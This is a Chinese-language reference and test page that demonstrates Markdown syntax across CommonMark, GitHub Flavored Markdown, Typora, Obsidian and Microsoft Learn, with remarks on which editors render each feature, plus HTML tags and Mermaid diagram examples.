<p>此外，对一些 Markdown 编辑器语法进行展示。其中，Typora 版本为最后一个免费版本（0.11.18），Obsidian 版本为 1.3.4。</p>
<h1>基础（CommonMark）</h1>
<p>这一部分测试 Markdown 基础语法，参考自 <a href="https://commonmark.org/">CommonMark</a>。这部分内容的成功渲染（除了下面的段落部分）是本文结构不至于散乱的基础（比如上文的标题、超链接、列表等的正确渲染）。</p>
<p>（第一段）这是一个很长很长很长很长的段落。</p>
<p>只有隔一个空行才能分锻，有点像 Latex。</p>
<p>在 CommonMark 语法中这三句话是一长句的。</p>
<p>【提示】在 Typora、Obsidian 中是换行了，这样做是有好处的。</p>
<p>（第二段）这是一个很长很长很长很长的段落。</p>
<p>与上一段之间隔了一个空行。</p>
<p>（第三段）这是一个很长很长很长很长的段落。\</p>
<p>反斜杠也能起到换行的作用。\</p>
<p>【提示】Typora、Obsidian 不需要这个符号，这样做会很方便。</p>
<h1>一级标题（类 Atx 形式）</h1>
<h2>二级标题（类 Atx 形式）</h2>
<h3>三级标题（类 Atx 形式）</h3>
<h1>一级标题（类 Setext 形式）</h1>
<h2>二级标题（类 Setext 形式）</h2>
<p>【提示】Obsidian 支持类 Setext 形式的标题，请在浏览模式下查看。</p>
<p><em>斜体（星号表示）</em>  <em>斜体（下划线表示）</em></p>
<p><strong>粗体（星号表示）</strong> <strong>粗体（下划线表示）</strong></p>
<blockquote>
<p>引言</p>
<blockquote>
<p>二级引言</p>
</blockquote>
<p>引言</p>
</blockquote>
<ul>
<li>无序列表 使用横线</li>
</ul>
<ul>
<li>无序列表 使用星号</li>
</ul>
<ol>
<li>有序列表 使用数字加点</li>
</ol>
<ol start="2">
<li>有序列表 使用数字加右括号</li>
</ol>
<p>【提示】Obsidian 中有序列表有区别。</p>
<ul>
<li>
<p>网状列表</p>
<ol>
<li>元素 1</li>
<li>元素 2</li>
</ol>
</li>
<li>
<p>网状列表</p>
<ul>
<li>使用横线</li>
</ul>
<ul>
<li>使用星号</li>
</ul>
</li>
</ul>
<p><a href="http://b.org">链接（方括号后加圆括号）</a></p>
<p><a href="http://b.org">带参考的链接 1</a> 链接外文字 <a href="http://b.org">带参考链接 2</a> 链接外文字</p>
<p><img src="https://commonmark.org/help/images/favicon.png" alt="图片链接"></p>
<p><img src="https://commonmark.org/help/images/favicon.png" alt="图片链接带脚注" title=" 图片标题 "></p>
<p>【提示】Obsidian 在浏览模式下正常，在编辑模式有点迷惑，这是由它们的链接特色决定的。</p>
<p>行内代码 <code>Inline Code</code> 行内代码（单个反引号包裹）</p>
<pre><code># 代码块（三个反引号包裹）
</code></pre>
<pre><code>代码块（四个空格开头）
代码块（紧挨上一行）
</code></pre>
<p>【提示】Obsidian 这里的代码块在浏览模式下没有区别</p>
<p>减号式下划线：</p>
<hr>
<p>星号式下划线：</p>
<hr>
<h1>GitHub Flavored Markdown（GFM）</h1>
<p>GitHub Flavored Markdown, often shortened as GFM, is the dialect of Markdown that is currently supported for user content on <a href="http://GitHub.com">GitHub.com</a> and GitHub Enterprise.</p>
<h2>基本格式语法</h2>
<p>这里只介绍 <a href="https://docs.github.com/zh/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax">基本撰写和格式语法 - GitHub 文档</a> 提及的规范。</p>
<p>与 CommonMark 对比新增了以下语法：</p>
<h4>支持四级标题（类 Atx 形式，井号方式）</h4>
<h5>支持五级标题（类 Atx 形式，井号方式）</h5>
<h6>支持六级标题（类 Atx 形式，井号方式）</h6>
<p><s>删除线（两条波浪线）</s></p>
<p><strong>粗体和嵌入 _ 斜体 _</strong>   两个星号内下划线括住。【提示】Obsidian 支持内嵌斜体，请在浏览模式打开。</p>
<p><em><strong>全部粗体和斜体（三个星号）</strong></em></p>
<p>使用<sub>下标</sub></p>
<p>使用<sup>上标</sup></p>
<ul>
<li>加号创建的无序列表</li>
</ul>
<p>任务列表展示：</p>
<ul>
<li>[x] 任务列表</li>
<li>[ ] 任务列表</li>
</ul>
<p>表情符号（使用冒号括住） :+1:   :smile:【提示】Obsidian 不支持，但是可以直接输入😯</p>
<p>脚注。使用此括号 [^11] 语法为您的内容 [^12] 添加脚注。</p>
<p>[^11]: My reference.<br>
[^12]: To add line breaks within a footnote, prefix new lines with 2 spaces.<br>
This is a second line. （然而 Typora 不支持这种方式换行）</p>
<p>【提示】Obsidian 会把脚注自动放到页面后。</p>
<p>支持转义符（反引号）忽略 Markdown 格式。</p>
<p>以下符号可以转义（<a href="https://daringfireball.net/projects/markdown/syntax">Daring Fireball: Markdown Syntax Documentation</a>）</p>
<p>\   backslash</p>
<p>`   backtick</p>
<p>*   asterisk</p>
<p>_   underscore</p>
<p>{}  curly braces</p>
<p>[]  square brackets</p>
<p>()  parentheses</p>
<p>支持 Markdown 的隐藏渲染：</p>
<!-- This content will not appear in the rendered Markdown -->
<p>【提示】Typora 处理仅仅是标黄，Obsidian 支持。</p>
<h2>高级格式</h2>
<p>如果你正在使用 Typora 预览，建议打开偏好设置调整以支持更多语法。</p>
<h3>表格</h3>
<p>表格末尾的竖线可选。单元格的宽度可以不同，无需在列内准确对齐。 标题行的第一列中必须至少有三个横线。可借助 <a href="https://www.tablesgenerator.com/markdown_tables">在线表格生成工具</a> 生成表格。</p>
<p>可以在表格中使用格式，例如链接、内联代码块和文本样式。</p>
<table>
<thead>
<tr>
<th>First Header</th>
<th>Second Header</th>
</tr>
</thead>
<tbody>
<tr>
<td>Content Cell</td>
<td>Content <strong>Cell</strong></td>
</tr>
<tr>
<td><a href="https://docs.github.com/zh/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables">Content Cell</a></td>
<td><em>Content</em> Cell</td>
</tr>
<tr>
<td><code>Content Cell</code></td>
<td><em><strong>Content</strong></em> Cell</td>
</tr>
</tbody>
</table>
<p>可以通过在标题行中连字符的左侧、右侧或两侧添加冒号 <code> :</code>，来靠左、靠右或居中对齐列中的文本。</p>
<p>若要包含竖线 <code>|</code> 作为单元格中的内容，请在竖线前使用 <code> \</code></p>
<table>
<thead>
<tr>
<th style="text-align:left">Left-aligned</th>
<th style="text-align:center">Center-aligned</th>
<th style="text-align:right">Right-aligned</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">git status</td>
<td style="text-align:center">git status</td>
<td style="text-align:right">git status</td>
</tr>
<tr>
<td style="text-align:left">git diff</td>
<td style="text-align:center">`</td>
<td style="text-align:right">git diff |</td>
</tr>
</tbody>
</table>
<h3>折叠部分</h3>
<details><summary>CLICK ME</summary>
<p>
<h4>We can hide anything, even code!</h4>
<pre><code class="language-ruby">   puts &quot;Hello World&quot;
</code></pre>
</p>
</details>
<p>【提示】Typora 看起来不支持，Obsidian 支持。</p>
<h3>代码块</h3>
<p>要在围栏代码块中显示三重倒引号，请将其包在四个倒引号内。</p>
<pre><code>```
Look! You can see my backticks.
```
</code></pre>
<p>支持语法高亮（使用 <a href="https://github.com/github-linguist/linguist">github-linguist/linguist: Language Savant. </a>）</p>
<pre><code class="language-python">def main():
	print(&quot;Hello World!&quot;)
</code></pre>
<p>使用代码块在 Markdown 中创建关系图。 GitHub 支持 Mermaid、GeoJSON、TopoJSON 和 ASCII STL 语法。</p>
<p>Mermaid 是一款受 Markdown 启发的工具，可将文本呈现为关系图。 例如，Mermaid 可以呈现流程图、序列图、饼图等。 有关详细信息，请参阅 <a href="https://mermaid-js.github.io/mermaid/#/">Mermaid 文档</a>。如果你的 Markdown 渲染器支持渲染的话，你应该看到下面流程图。</p>
<pre><code class="language-mermaid">graph TD;
    A--&gt;B;
    A--&gt;C;
    B--&gt;D;
    C--&gt;D;
</code></pre>
<p>可使用 GeoJSON 或 TopoJSON 语法创建交互式地图。 若要创建地图，请使用 <code>geojson</code> 或 <code>topojson</code> 语法标识符在围栏代码块中添加 GeoJSON 或 TopoJSON。如果你的 Markdown 渲染器支持渲染的话，你应该看到下面两幅图。</p>
<pre><code class="language-geojson">{
  &quot;type&quot;: &quot;FeatureCollection&quot;,
  &quot;features&quot;: [
    {
      &quot;type&quot;: &quot;Feature&quot;,
      &quot;id&quot;: 1,
      &quot;properties&quot;: {
        &quot;ID&quot;: 0
      },
      &quot;geometry&quot;: {
        &quot;type&quot;: &quot;Polygon&quot;,
        &quot;coordinates&quot;: [
          [
              [-90,35],
              [-90,30],
              [-85,30],
              [-85,35],
              [-90,35]
          ]
        ]
      }
    }
  ]
}
</code></pre>
<pre><code class="language-topojson">{
  &quot;type&quot;: &quot;Topology&quot;,
  &quot;transform&quot;: {
    &quot;scale&quot;: [0.0005000500050005, 0.00010001000100010001],
    &quot;translate&quot;: [100, 0]
  },
  &quot;objects&quot;: {
    &quot;example&quot;: {
      &quot;type&quot;: &quot;GeometryCollection&quot;,
      &quot;geometries&quot;: [
        {
          &quot;type&quot;: &quot;Point&quot;,
          &quot;properties&quot;: {&quot;prop0&quot;: &quot;value0&quot;},
          &quot;coordinates&quot;: [4000, 5000]
        },
        {
          &quot;type&quot;: &quot;LineString&quot;,
          &quot;properties&quot;: {&quot;prop0&quot;: &quot;value0&quot;, &quot;prop1&quot;: 0},
          &quot;arcs&quot;: [0]
        },
        {
          &quot;type&quot;: &quot;Polygon&quot;,
          &quot;properties&quot;: {&quot;prop0&quot;: &quot;value0&quot;,
            &quot;prop1&quot;: {&quot;this&quot;: &quot;that&quot;}
          },
          &quot;arcs&quot;: [[1]]
        }
      ]
    }
  },
  &quot;arcs&quot;: [[[4000, 0], [1999, 9999], [2000, -9999], [2000, 9999]],[[0, 0], [0, 9999], [2000, 0], [0, -9999], [-2000, 0]]]
}
</code></pre>
<p>GFM 可以直接在 Markdown 中使用 ASCII STL 语法来创建交互式 3D 模型。 若要显示模型，请使用 <code>stl</code> 语法标识符在围栏代码块中添加 ASCII STL 语法。如果你的 Markdown 渲染器支持渲染的话，应该看到一个立方体而不是代码块。</p>
<pre><code class="language-stl">solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
</code></pre>
<p>【提示】Typora、Obsidian 不支持 <code>geojson</code> 、 <code>topojson</code> 或 <code>ASCII STL </code> 语法。</p>
<h3>数学表达式</h3>
<p>内联表达式：This sentence uses <code>$</code> delimiters to show math inline:  $\sqrt{3x-1}+(1+x)^2$</p>
<p>要以块的形式添加数学表达式，请启动一个新行，并使用两个美元符号 <code>$$</code> 分隔表达式。</p>
<p>$$<br>
\left( \sum_{k=1}^n a_k b_k \right)^2 \leq \left( \sum_{k=1}^n a_k^2 \right) \left( \sum_{k=1}^n b_k^2 \right)<br>
$$</p>
<p>或者，可以使用 <code>math</code> 代码块语法将数学表达式显示为块。 使用此语法时，无需使用 <code>$$</code> 分隔符。【提示】Typora、Obsidian 不支持。</p>
<pre><code class="language-math">\sqrt{3}
</code></pre>
<p>表示美元符号：</p>
<ul>
<li>
<p>在数学表达式内，在显式 <code>$</code> 之前添加一个 <code>\</code> 符号。</p>
<ul>
<li>This expression uses <code>\$</code> to display a dollar sign: $\sqrt{$4}$</li>
</ul>
</li>
<li>
<p>在数学表达式之外，但在同一行上，在显式 <code>$</code> 两边使用 span 标记。</p>
<ul>
<li>To split <span>$</span>100 in half, we calculate $100/2$</li>
</ul>
</li>
</ul>
<p>如果你还想学习更多，请看 <a href="https://github.github.com/gfm/">GitHub Flavored Markdown Spec</a></p>
<h1>Typora</h1>
<p><strong>Typora</strong> 使用 GFM，其特色在于“WYSIWYG”，其有自己特色的语法渲染。</p>
<p>使用类 Setext 形式 (<a href="https://en.wikipedia.org/wiki/Setext">Setext - Wikipedia</a>) 创建标题。注意使用 Shift+Enter 换行。（有线）</p>
<p>使用类 Atx 形式创建标题，一共可以有 6 个级别。（井号）</p>
<p>使用 <code>[TOC]</code> 创建目录：</p>
<p>[TOC]</p>
<p>分割线使用三个以上符号（最后一个使用了标签）。符号中间可以插入空格。</p>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr />
<p><kbd>Esc</kbd></p>
<p>段落的换行是使用两个以上的空格加回车（在 Typora 编辑器里是<kbd>Shift</kbd>+<kbd>Enter</kbd>）<br>
或者使用 HTML 标签<br>进行换行</p>
<p>不要吝惜回车，在一些情况下回车会被吞掉！</p>
<p>代码块内还能高亮：</p>
<pre><code class="language-gfm">Here's an example:

```js
function test() {
  console.log(&quot;notice the blank line before this function?&quot;);
}
```

syntax highlighting:
```ruby
require 'redcarpet'
markdown = Redcarpet.new(&quot;Hello World!&quot;)
puts markdown.to_html
```
</code></pre>
<p>Typora now supports <a href="http://jekyllrb.com/docs/frontmatter/">YAML Front Matter</a>. Input <code>---</code> at the top of the article and then press <code>Return</code> to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora. 这里就不演示了哈，弄 Hexo 的喜闻乐见。</p>
<p>支持有标题的 Link，试试鼠标停留在上面：<a href="http://example.com/" title="Title">an example</a></p>
<p>Typora allows you to insert URLs as links, wrapped by <code>&lt;</code>brackets<code>&gt;</code>.</p>
<p><code>&lt;i@typora.io&gt;</code> becomes <a href="mailto:i@typora.io">i@typora.io</a>.</p>
<p>Typora will also automatically link standard URLs. e.g: <a href="http://www.google.com">www.google.com</a>. 就是没有任何标记也解析出地址了。</p>
<p>Underline is powered by raw HTML.</p>
<p>支持下划线：<code>&lt;u&gt;下划线&lt;/u&gt;</code> becomes <u>下划线</u>.</p>
<p>支持上下标（在偏好设置中设置）：H~2~O  X^2^</p>
<p>支持高亮：==highlight==</p>
<h1>Obsidian Flavored Markdown（OFM）</h1>
<p>Obsidian 是一个基于 Markdown 进行记录的知识库软件，特点在于支持笔记的双向链接。因此，有自己的独特语法。</p>
<p>Obsidian 努力让 Obsidian 的语法不偏离正统的 Markdown 语法太多。总的来看，Obsidian 的语法大多还是基于 CommonMark，包括了一些 GitHub Flavored Markdown（GFM）和 LaTeX，以及 Obsidian<strong>特有的</strong>语法。</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>[[ ]]</strong></td>
<td><a href="https://help.obsidian.md/Linking+notes+and+files/Internal+links">Internal links</a></td>
</tr>
<tr>
<td><strong>![[ ]]</strong></td>
<td><a href="https://help.obsidian.md/Linking+notes+and+files/Embedding+files">Embedding files</a></td>
</tr>
<tr>
<td><code>%%</code></td>
<td><a href="https://help.obsidian.md/Editing+and+formatting/Basic+formatting+syntax#Comments">Comments</a></td>
</tr>
<tr>
<td><code>&gt; [!note]</code></td>
<td><a href="https://help.obsidian.md/Editing+and+formatting/Callouts">Callouts</a></td>
</tr>
</tbody>
</table>
<p>提示：为防止其他插件影响，Embedding files 的示例含转义字符。</p>
<p>Obsidian doesn't support Markdown syntax or blank lines within HTML blocks.</p>
<p>参考：</p>
<ul>
<li><a href="https://publish.obsidian.md/help-zh/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%BD%A0%E7%9A%84%E7%AC%94%E8%AE%B0">格式化你的笔记 - Obsidian 中文帮助 - Obsidian Publish</a></li>
<li><a href="https://help.obsidian.md/Editing+and+formatting/Obsidian+Flavored+Markdown">Obsidian Flavored Markdown - Obsidian Help</a></li>
</ul>
<h2>Internal links 内部链接</h2>
<p>通过 <strong>[[ ]]</strong> 来链接库中任意一个文件。</p>
<pre><code class="language-markdown">链接一篇笔记：[[内部链接]]。
</code></pre>
<p>你可以将图片或者音频等附件嵌入到你的笔记中。嵌入文件的语法为 <strong>![[文件名.png]]</strong></p>
<p>你可以通过相同的语法将 PDF 文件嵌入到你的笔记中。除此之外，你可以通过 <strong>![[My File.pdf#page=number]]</strong> 这样的形式直接指定嵌入 PDF 文件的页码。</p>
<p>由于 Markdown 兼容 HTML，因此你可以使用“iframe”将网页嵌入到笔记中。</p>
<blockquote>
<p>这个语法实际受到了 Markdown 相关语法的启发：</p>
<ol>
<li>在 Markdown 中，[Image](link.png) 可以让链接指向图片，而 ![Image](link.png) 能让图片嵌入到当前文档中。</li>
<li>而 <a href="https://publish.obsidian.md/help-zh/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/%E5%86%85%E9%83%A8%E9%93%BE%E6%8E%A5">内部链接</a> 的语法则基于以下设定：[[My page]] 是 [My page](My page) 的一个便捷写法（或者是“语法糖”）。</li>
</ol>
<p>综上，我们可以得到 ![[My page]] 应该等效于 ![My page](My page)。</p>
<p>当然，我们也可以使用其他形式的语法。比如，Roam Research 的嵌入语法为 <code>{{embed: ((NODE_ID))}}</code>。我们曾经想过使用 <code>((Page name))</code> 这样的形式来表示嵌入，但后来我们认为还是 <strong>![[Page Name]]</strong> 的形式能更好地与其他语法保持一致，便于记忆，同时也能减少符号的占用，让其他符号能够表示其他含义。</p>
</blockquote>
<p>你可以通过以下语法调整嵌入到笔记中的图片的大小：</p>
<p>Markdown 风格的嵌入，使用 <strong>![AltText|100x100](<a href="https://url/to/image.png%5C">https://url/to/image.png\</a>)</strong> 这样的语法。</p>
<p>一般的嵌入，使用 <strong>![[image.png|100x100]]</strong> 这样的语法。</p>
<p>如果要根据图像的宽高比例进行缩放，请省略高度，如 <strong>![[image.png|100]]</strong>。</p>
<p><a href="https://publish.obsidian.md/help-zh/%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/%E4%BD%BF%E7%94%A8+obsidian+URI">Obsidian URI</a> 可以让你在其他应用或 Obsidian 的其他库中打开当前库的某篇笔记。</p>
<p>比如，你可以通过以下方式跳转到某个库中的某篇笔记（请注意 <a href="https://publish.obsidian.md/help-zh/%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/%E4%BD%BF%E7%94%A8+obsidian+URI#%E7%BC%96%E7%A0%81">URI 的编码</a>）：</p>
<pre><code class="language-md">[打开某篇笔记](obsidian://open?path=D:%2Fpath%2Fto%2Ffile.md)
</code></pre>
<p>如果 url 中含有空格的话，空格需要转义为 <code>%20</code>，如：</p>
<pre><code class="language-md">[Export options](Pasted%20image)
</code></pre>
<p>示例：<a href="Pasted%20image">Export options</a></p>
<p>当然，你也可以用 <code>&lt;&gt;</code> 将空格包含起来，如：</p>
<pre><code class="language-md">[Slides Demo](&lt;Slides Demo&gt;)
</code></pre>
<p>示例：<a href="Slides%20Demo">Slides Demo</a></p>
<h2>Comments 注释</h2>
<p>所谓注释，指的是会在编辑模式中显示，但不会在预览模式中显示的内容。使用 <code>%%</code> 可以将内容变为注释。以下为语法：</p>
<pre><code class="language-md">这里是行内注释：%%预览模式下你将看不到这句话%%

这里是跨行注释：
%%
所谓跨行
就是可以有很多行
%%
</code></pre>
<p>以下为示例：</p>
<p>这里是行内注释：%% 预览模式下你将看不到这句话%%</p>
<p>这里是跨行注释：</p>
<p>%%<br>
所谓跨行<br>
就是可以有很多行<br>
%%</p>
<h2>标注 Callouts</h2>
<blockquote>
<p>GFM也存在类似的语法：<a href="https://docs.github.com/en/contributing/style-guide-and-content-model/style-guide">Style guide - GitHub Docs</a><br>
Microsoft也有类似的语法：<a href="https://learn.microsoft.com/en-us/contribute/content/markdown-reference">Markdown reference for Microsoft Learn - Contributor guide | Microsoft Learn</a></p>
</blockquote>
<p>在不打断笔记流的情况下使用标注附加内容。</p>
<blockquote>
<p>[!info]<br>
默认标题<br>
Here's a callout block.<br>
It supports <strong>Markdown</strong>, <em>Wikilinks and embeds</em>!</p>
<p>无序列表：</p>
<ul>
<li>项目 1</li>
</ul>
<p>有序列表：</p>
<ol>
<li>项目 a</li>
</ol>
</blockquote>
<blockquote>
<p>[!tip] 自定义标题<br>
公式渲染：<br>
$$<br>
r+v-e=2<br>
$$</p>
<p>行内代码：<code>Class&lt;?&gt; class = MyClass.class;</code></p>
<p>图片：<img src="https://commonmark.org/help/images/favicon.png" alt="图片链接"></p>
</blockquote>
<blockquote>
<p>[!error] 标题内公式 $a^2+b^2=c^2$，标题内代码 <code>Hello world!</code></p>
</blockquote>
<blockquote>
<p>[!cite] 标题内图片：<img src="https://commonmark.org/help/images/favicon.png" alt="图片链接">图片后文字</p>
</blockquote>
<blockquote>
<p>[!question] Can callouts be nested?</p>
<blockquote>
<p>[!todo] Yes!, they can.</p>
<blockquote>
<p>[!example]  You can even use multiple layers of nesting.</p>
</blockquote>
</blockquote>
</blockquote>
<p>支持以下类型：</p>
<ul>
<li>note</li>
<li>abstract, summary, tldr</li>
<li>info</li>
<li>todo</li>
<li>tip, hint, important</li>
<li>success, check, done</li>
<li>question, help, faq</li>
<li>warning, caution, attention</li>
<li>failure, fail, missing</li>
<li>danger, error</li>
<li>bug</li>
<li>example</li>
<li>quote, cite</li>
</ul>
<blockquote>
<p>[!Any]<br>
当类型不在列表中时。</p>
</blockquote>
<blockquote>
<p>[!note]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!abstract]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!summary]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!tldr]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!info]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!todo]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!tip]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!hint]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!important]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!success]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!check]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!done]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!question]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!help]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!faq]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!warning]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!caution]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!attention]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!failure]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!fail]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!missing]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!danger]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!error]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!bug]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!example]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!quote]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<blockquote>
<p>[!cite]<br>
Lorem ipsum dolor sit amet</p>
</blockquote>
<h2>其他</h2>
<h3>图表</h3>
<p>Obsidian 通过 <a href="https://mermaid-js.github.io/">Mermaid</a> 及其所提供的 <a href="https://mermaid-js.github.io/mermaid-live-editor">编译器</a> 来为用户提供图表的绘制功能。</p>
<h1>Microsoft Learn</h1>
<p>Microsoft Learn 还支持自定义 Markdown 扩展。</p>
<p>例如：警报（备注、提示、重要提示、提醒、警告）</p>
<blockquote>
<p>[!NOTE]<br>
Information the user should notice even if skimming.</p>
</blockquote>
<blockquote>
<p>[!TIP]<br>
Optional information to help a user be more successful.</p>
</blockquote>
<blockquote>
<p>[!IMPORTANT]<br>
Essential information required for user success.</p>
</blockquote>
<blockquote>
<p>[!CAUTION]<br>
Negative potential consequences of an action.</p>
</blockquote>
<blockquote>
<p>[!WARNING]<br>
Dangerous certain consequences of an action.</p>
</blockquote>
<p>其他语法详见文档：<a href="https://learn.microsoft.com/zh-cn/contribute/markdown-reference">Microsoft Learn 的 Markdown 参考 - Contributor guide | Microsoft Learn</a></p>
<p>【提示：与 OFM 的 Callouts 语法一致，具体详看 OFM】</p>
<h1>附</h1>
<h2>HTML 支持情况</h2>
<iframe height='265' scrolling='no' title='Fancy Animated SVG Menu' src='http://codepen.io/jeangontijo/embed/OxVywj/?height=265&theme-id=0&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;'></iframe>
<pre><code>&lt;video src=&quot;xxx.mp4&quot; /&gt;  # 这个放在Hexo会使后文无法显示，故此处以代码块包围
</code></pre>
<p>可以使用普通的 <code>&lt;img&gt;</code> 标签指定图片的高度与宽度：</p>
<img src="https://commonmark.org/help/images/favicon.png" width="30%">
<h3>一般标签</h3>
<p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。</p>
<p>使用<kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>A</kbd>快速打开 QQ 截屏工具，这里使用了 <code>&lt;kbd&gt;</code> 标签</p>
<p>这是<sub>下标</sub>   这是<sup>上标</sup>    换行标签<br>换行了</p>
<p>标签：</p>
<p><em>强调的内容 (好像和斜体差不多)</em> [^斜体]   <strong>语气更强 (粗体？)</strong>[^加粗]    <code>代码 scanf()</code>    <var>变量</var>    <cite>引用</cite></p>
<h3>字体、颜色和大小</h3>
<p><b>粗体文本</b>    <i>斜体文本</i>    <big>大号字体</big>    <small>小号字体</small>    <tt>等宽文本</tt>  <u>下划线</u></p>
<p><font face="黑体">黑体</font>  <font face="微软雅黑">微软雅黑</font>  <font face="STCAIYUN">华文彩云</font>  <font face="华文行楷" >华文行楷</font>  <font face="时尚中黑" >时尚中黑</font>  （我猜你电脑里装有什么字体就能用什么字体）</p>
<p><mark>黄色高亮</mark></p>
<p><font color=#00ffff size=3>#00ffff</font>   <font color=gray size=3>gray 色</font>    <font color=#0099ff size=5 face="黑体">#0099ff size=5 黑体</font></p>
<p><a href='#color'>附录：颜色名列表</a></p>
<h3>折叠段落</h3>
<details><summary>Title</summary>
content
</details>
<h3>设置锚点</h3>
<p><a href='#jump'>点我跳转（Typora 下按住 Ctrl 键点击）</a></p>
<p><a href="#jump_two">点我跳转2</a></p>
<p>这里给出两种方法实现锚点</p>
<p><a name='jump'>跳转到这里</a></p>
<p><span id = "jump_two">跳转到这里 2</span></p>
<h3>表格</h3>
<table><tbody>
    <tr>
        <th rowspan="3">我占了三行</th>
        <th><font color="Green">第一列</font></th>
        <th>第二列</th>
        <th>第三列</th>
    </tr>
    <tr>
        <td bgcolor="Tomato">第一列</td>
        <td>第二列</td>
        <td>第三列</td>
    </tr>
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td>第三列</td>
    </tr>
</table>
<h3>段首缩进</h3>
<p>使用特殊占位符，不同占位符所占空白是不一样大的（请在源码模式下查看）：</p>
<p>  或者  表示一个半角的空格</p>
<p>  或者  表示一个全角的空格</p>
<p>  或者  两个全角的空格（用的比较多）</p>
<p>  或者  不断行的空白格</p>
<h3>特殊符号</h3>
<p>©  ™  &amp;  &lt;  &gt;  £ ¥ € ® ± §  X² Y³ ¾ « » 37.2ºC</p>
<h2>Mermaid 图示例</h2>
<h3>流程图</h3>
<h4>横向流程图</h4>
<pre><code class="language-mermaid">graph LR
A[方形] --&gt;B(圆角)
    B --&gt; C{条件a}
    C --&gt;|a=1| D[结果1]
    C --&gt;|a=2| E[结果2]
    F[横向流程图]
</code></pre>
<h4>竖向流程图</h4>
<pre><code class="language-mermaid">graph TD
A[方形] --&gt; B(圆角)
    B --&gt; C{条件a}
    C --&gt; |a=1| D[结果1]
    C --&gt; |a=2| E[结果2]
    F[竖向流程图]
</code></pre>
<h3>UML 标准时序图</h3>
<pre><code class="language-mermaid">%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头
  sequenceDiagram
    participant 张三
    participant 李四
    张三-&gt;王五: 王五你好吗？
    loop 健康检查
        王五-&gt;王五: 与疾病战斗
    end
    Note right of 王五: 合理 食物 &lt;br/&gt;看医生...
    李四--&gt;&gt;张三: 很好!
    王五-&gt;李四: 你怎么样?
    李四--&gt;王五: 很好!
</code></pre>
<h3>甘特图</h3>
<pre><code class="language-mermaid">%% 语法示例
        gantt
        dateFormat  YYYY-MM-DD
        title 软件开发甘特图
        section 设计
        需求                      :done,    des1, 2014-01-06,2014-01-08
        原型                      :active,  des2, 2014-01-09, 3d
        UI设计                     :         des3, after des2, 5d
    未来任务                     :         des4, after des3, 5d
        section 开发
        学习准备理解需求                      :crit, done, 2014-01-06,24h
        设计框架                             :crit, done, after des2, 2d
        开发                                 :crit, active, 3d
        未来任务                              :crit, 5d
        耍                                   :2d
        section 测试
        功能测试                              :active, a1, after des3, 3d
        压力测试                               :after a1  , 20h
        测试报告                               : 48h
</code></pre>
<h2>sequence 图示例</h2>
<p>【提示】Obsidian 不支持。</p>
<h3>UML 时序图</h3>
<pre><code class="language-sequence">对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
